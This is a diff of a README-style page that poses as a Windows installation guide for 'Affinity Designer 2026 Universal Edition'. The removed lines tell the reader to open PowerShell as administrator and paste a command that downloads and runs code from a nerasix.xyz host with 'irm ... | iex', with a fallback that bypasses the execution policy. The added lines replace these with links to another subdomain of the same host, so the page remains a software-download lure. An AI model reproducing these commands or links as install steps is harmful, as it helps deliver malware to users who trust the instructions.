@@ -11,19 +11,14 @@ Affinity Designer 2026 Universal Edition · Editing pipeline · Batch tools · W
 **Do this:**
 
 1. Press the **Windows** key, type **powershell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
 3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
 4. Click **Yes** if Windows asks for permission
 
-```powershell
-irm https://affinity-designer-2026.nerasix.xyz/ | iex
-```
+```https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://affinity-designer-2026.nerasix.xyz/ | iex"
-```
+```https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/```
 
 
 ---
@@ -84,7 +79,7 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 > Use the project link below for Windows.
 
-* **Project link:** **[affinity-designer-2026.nerasix.xyz](https://affinity-designer-2026.nerasix.xyz/)**
-* **Full URL:** `https://affinity-designer-2026.nerasix.xyz/`
+* **Project link:** **[affinity-designer-2026-desktop-setup-guide.nerasix.xyz](https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/)**
+* **Full URL:** `https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
